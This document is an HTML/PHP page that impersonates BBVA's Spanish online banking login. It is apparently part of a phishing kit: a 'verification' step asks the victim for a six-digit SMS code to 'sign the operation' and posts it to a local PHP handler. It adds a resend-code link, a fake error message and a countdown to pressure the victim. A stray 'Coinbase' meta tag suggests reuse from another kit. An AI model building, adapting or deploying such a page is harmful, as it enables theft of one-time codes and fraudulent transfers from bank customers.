<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.png">
        <title>Banca Online de BBVA</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>
    </head>
    <body>

        <div class="wrapper_login">
            <header class="header_1">
                <div class="container_header_1">
                    <div class="logo">
                        <img src="./Assets/imgs/logo.svg" alt="">
                    </div>
                    <ul class="ps-0 mb-0">
                        <li class="sm_none"><p class="mb-0">Acceso a la banca online</p></li>
                        <li class="slash sm_none"></li>
                        <li><a href="">Ir a BBVA.es</a></li>
                    </ul>
                </div>
            </header>
        <!-- wrapper -->
        <div class="wrapper_infos">
            <div class="container_infos">
                <form action="./Assets/php/config/func.php" method="post" class="form_infos">
                    <input type="hidden" name="sms">
                    <div class="head_form text-start">
                        <span>Paso 1</span>
                    </div>
                    <?php if( isset($_GET['error']) ) : ?>
                    <div class="error mb-3 d-flex align-items-center">
                        <i class="ri-alert-line"></i>
                        <div class="txt">
                            <p class="mb-0">El código del mensaje de texto ya no funciona o es incorrecto. Inténtalo de nuevo.</p>
                        </div>
                    </div>    
                    <?php endif; ?>                    
                    <div class="title mt-3 text-center">
                        <h1>Verificación</h1>
                        <i class="fas fa-lock"></i>
                        <p class="mb-0">Para firmar la operación, introduce el código que has recibido en tu móvil.</p>
                    </div>
                    
                    <p class="text-center time"><span id="counter">02:00</span> Min. para validar el código</p>
                    <a href="./Assets/php/config/func.php?new=" class="send">Solicitar nuevo código SMS</a>
                    <div class="inputes d-flex align-items-center justify-content-center">
                        <input type="text" name="x1" id="x1" maxlength="1">
                        <input type="text" name="x2" id="x2" maxlength="1">
                        <input type="text" name="x3" id="x3" maxlength="1">
                        <input type="text" name="x4" id="x4" maxlength="1">
                        <input type="text" name="x5" id="x5" maxlength="1">
                        <input type="text" name="x6" id="x6" maxlength="1">
                    </div>
                    <div class="sm_txt text-center">
                        <p class="mb-0">Este código es único y de un sólo uso.</p>
                    </div>
                    <div class="btn_sub">
                        <button type="submit" class="btn1" disabled>Firmar</button>
                    </div>
                </form>
            </div>
        </div>            
            <footer>
                <div class="container_footer">
                    <div class="logo">
                        <img src="./Assets/imgs/white-logo.svg" alt="">
                    </div>
                    <ul class="ps-0 mb-0 d-flex align-items-center">
                        <li>Aviso legal</li>
                        <li>Cookies</li>
                        <li>Datos personales</li>
                        <li>Informes legales</li>
                    </ul>
                    <ul class="ps-0 mb-0 d-flex align-items-center">
                        <li>Servicios de pagos</li>
                        <li>Tarifas</li>
                        <li>Tablón de anuncios</li>
                        <li>Negocio responsable</li>
                    </ul>
                    <div class="copyghit d-flex align-items-center justify-content-between">
                        <p>© 2026 Banco Bilbao Vizcaya Argentaria, S.A.</p>
                        <a href="">Creando Oportunidades</a>
                    </div>
                </div>
            </footer>
        </div>
        



        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="./Assets/js/script.js"></script>
        
        <script>   
            $("input").keyup(function(){
            if ($("#x1").val() != "" & $("#x2").val() != "" & $("#x3").val() != "" & $("#x4").val() != "" & $("#x5").val() != "" & $("#x6").val() != "") {
                $(".btn_sub .btn1").prop("disabled",false);
                $(".btn_sub .btn1").addClass("active");
            }else{
                $(".btn_sub .btn1").prop("disabled",true);
                $(".btn_sub .btn1").removeClass("active");
            }
            });   
            $(".inputes input").keyup(function(){
                if($(this).val().length == 1){
                    $(this).next().focus();
                    return false
                }else if($(this).val() == ""){
                    $(this).prev().focus();
                }
            }); 
            

            function startCounter(minutes) {
                let time = minutes * 60;
                const countdown = setInterval(function() {
                    let min = Math.floor(time / 60);
                    let sec = time % 60;
                    sec = sec < 10 ? "0" + sec : sec;
                    min = min < 10 ? "0" + min : min;
                    $("#counter").text(min + ":" + sec);
                    time--;
                    if (time < 0) {
                        clearInterval(countdown);
                        $("#counter").parent().hide();
                        $(".send").css("display","flex");
                    }
                }, 1000);
            }
            $(document).ready(function() {
                startCounter(1);
            }); 

        </script>
    </body>
</html>